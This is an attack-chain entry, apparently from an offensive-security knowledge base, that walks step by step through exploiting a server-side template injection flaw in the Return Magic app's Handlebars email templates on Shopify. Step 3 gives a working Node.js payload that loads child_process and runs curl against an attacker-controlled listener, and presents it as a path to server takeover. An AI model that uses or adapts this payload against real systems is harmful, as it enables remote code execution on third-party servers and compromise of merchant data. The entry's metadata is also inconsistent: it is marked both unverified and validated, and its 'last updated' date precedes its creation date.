---
tags:
  - ssti
  - rce
  - shopify
  - handlebars
  - nodejs
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/node-ssti-rce-payload]]'
  - '[[commands/curl-http-request]]'
platforms:
  - Web
  - Node.js
complexity: medium
procedures:
  - '[[procedures/Install-and-Access-Return-Magic-App]]'
  - '[[procedures/Identify-SSTI-Vulnerability-in-Email-Templates]]'
  - '[[procedures/Exploit-SSTI-for-Remote-Code-Execution]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
description: >-
  Exploitation of SSTI vulnerability in Return Magic app's email templates on
  Shopify to achieve RCE
skill_level: intermediate
impact_level: high
id: abbcb22d-78ba-406e-9a66-1f01dfda70f4
created_at: '2025-12-11T06:10:15.493Z'
updated_at: '2025-12-11T06:10:15.493Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1059]]'
---
# Server Side Template Injection in Shopify Return Magic Leading to Remote Code Execution

Multi-stage attack chain demonstrating exploitation of an SSTI vulnerability in the Return Magic app on Shopify, leading to arbitrary JavaScript execution and ultimately remote code execution on the Node.js backend. The vulnerability was in the Handlebars.js templating engine used for email templates, allowing injection of malicious payloads. This chain covers installation, vulnerability identification, and exploitation, with potential impact of server takeover.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access] --> B[Vulnerability Identification]
    B --> C[Execution and RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- None (browser-based access)

### Target Environment

- Shopify store with Return Magic app installed
- Web platform using Node.js and Handlebars.js
- Access to email for testing

### Initial Access Requirements

- Shopify store ownership or access
- Ability to install apps

## Detailed Attack Procedures

## Step 1: Install and Access App - [[procedures/Install-and-Access-Return-Magic-App]]

**Objective**: Gain access to the vulnerable email template editor in the Return Magic app.

**Instructions**: Install the Return Magic app on a Shopify store to access its features. Navigate to the app's admin page at https://<shop>.myshopify.com/admin/apps/returnmagic. Open Settings and Emails Workflow from the top menu, then Emails -> Workflow from the left menu.

**Expected Output**: Access to the email template editor.

**Success Indicators**:
- App installed successfully
- Workflow page loaded

## Step 2: Identify SSTI Vulnerability - [[procedures/Identify-SSTI-Vulnerability-in-Email-Templates]]

**Objective**: Confirm the presence of SSTI by injecting a test payload and observing the output.

**Instructions**: Edit an email template by clicking Edit, then the code icon, and insert {{this}}. Send a test email from the Workflow page by clicking 'Send me a test email' and entering your email. Check the inbox for rendered output showing [Object Object], indicating template injection.

**Expected Output**: Received email with [Object Object] confirming SSTI.

**Success Indicators**:
- Test email received
- Output indicates Node.js backend evaluation

## Step 3: Exploit for RCE - [[procedures/Exploit-SSTI-for-Remote-Code-Execution]]

**Objective**: Achieve remote code execution by injecting a payload to load modules and execute system commands.

**Instructions**: Insert the payload using [[commands/node-ssti-rce-payload]] into the template:

```javascript
process.mainModule.constructor._load('child_process').exec('curl http://[ip]:[port]/')
```

Send a test email to trigger execution. The embedded [[commands/curl-http-request]] will connect to your listener:

```bash
curl http://[ip]:[port]/
```

**Expected Output**: Connection to your server confirming RCE.

**Success Indicators**:
- Curl request received on listener
- Potential server takeover possible

## Attack Chain Summary

### Key Achievements

1. Confirmed SSTI in Handlebars.js templates
2. Achieved arbitrary JavaScript execution
3. Executed system commands for RCE

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

*Last updated: 2023-10-01*
